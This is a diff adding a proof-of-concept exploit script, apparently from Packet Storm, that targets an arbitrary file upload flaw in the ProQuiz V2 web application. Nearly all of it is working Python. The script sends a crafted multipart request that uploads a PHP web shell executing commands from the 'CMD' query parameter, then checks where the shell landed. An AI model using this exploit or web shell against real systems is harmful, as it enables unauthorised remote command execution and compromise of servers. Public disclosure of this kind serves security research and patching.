@@ -1,0 +1,90 @@
+Source: http://packetstormsecurity.org/files/view/98669/ProQuiz-Shell.py.txt
+
+# ------------------------------------------------------------------------
+# Software................ProQuiz V2
+# Vulnerability...........Arbitrary Upload
+# Download................http://proquiz.softon.org/
+# Release Date............2/20/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# ------------------------------------------------------------------------
+# 
+# --Description--
+# 
+# An arbitrary upload vulnerability in ProQuiz V2 can be exploited to
+# upload a PHP shell.
+# 
+# 
+# --PoC--
+import socket
+
+host = 'localhost'
+path = '/proquizv2b'
+shell_path = path + '/images/upload/users/.php'
+port = 80
+
+def upload_shell():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    s.settimeout(8)    
+
+    s.send('POST ' + path + '/functions.php?action=edit_profile&type=other HTTP/1.1\r\n'
+           'Host: localhost\r\n'
+           'Connection: keep-alive\r\n'
+           'Referer: http://localhost/proquizv2b/my_account.php?action=getpage&page=edit_profile&type=other\r\n'
+           'Content-Length: 718\r\n'
+           'Cache-Control: max-age=0\r\n'
+           'Origin: http://localhost\r\n'
+           'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.82 Safari/534.16\r\n'
+           'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4IQJE6qsLBAizBLu\r\n'
+           'Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n'
+           'Accept-Encoding: gzip,deflate,sdch\r\n'
+           'Accept-Language: en-US,en;q=0.8\r\n'
+           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
+           '\r\n'
+           '------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n'
+           'Content-Disposition: form-data; name="fname"\r\n'
+           '\r\n'
+           'test\r\n'
+           '------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n'
+           'Content-Disposition: form-data; name="lname"\r\n'
+           '\r\n'
+           'test\r\n'
+           '------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n'
+           'Content-Disposition: form-data; name="profile"\r\n'
+           '\r\n'
+           '\r\n'
+           '------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n'
+           'Content-Disposition: form-data; name="dob"\r\n'
+           '\r\n'
+           '10/10/10\r\n'
+           '------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n'
+           'Content-Disposition: form-data; name="gender"\r\n'
+           '\r\n'
+           'm\r\n'
+           '------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n'
+           'Content-Disposition: form-data; name="photo"; filename="shell.php"\r\n'
+           'Content-Type: image/jpeg\r\n'
+           '\r\n'
+           '<?php echo \'<pre>\' + system($_GET[\'CMD\']) + \'</pre>\'; ?>\r\n'
+           '------WebKitFormBoundary4IQJE6qsLBAizBLu--\r\n')
+
+    resp = s.recv(8192)
+
+    http_redirect = 'HTTP/1.1 302'
+    http_ok = 'HTTP/1.1 200'
+    
+    if http_redirect not in resp[:len(http_redirect)]:
+        print 'error uploading shell'
+        return
+    else: print 'shell uploaded'
+
+    s.send('GET ' + shell_path + ' HTTP/1.1\r\n'\
+           'Host: ' + host + '\r\n\r\n')
+
+    if http_ok not in s.recv(8192)[:len(http_ok)]: print 'shell not found'        
+    else: print 'shell located at http://' + host + shell_path
+
+upload_shell()
